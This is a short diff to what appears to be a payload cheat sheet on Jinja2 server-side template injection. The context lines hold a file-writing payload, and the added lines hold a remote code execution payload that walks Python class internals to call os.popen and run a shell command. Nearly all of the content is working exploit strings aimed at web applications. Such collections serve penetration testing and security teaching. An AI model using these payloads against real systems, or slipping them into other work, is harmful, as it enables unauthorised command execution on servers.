@@ -384,6 +384,10 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 ```python
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
 ```
+### Jinja2 - Remote Code Execution using mro class
+```
+{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}
+```
 
 ### Jinja2 - Remote Code Execution
 
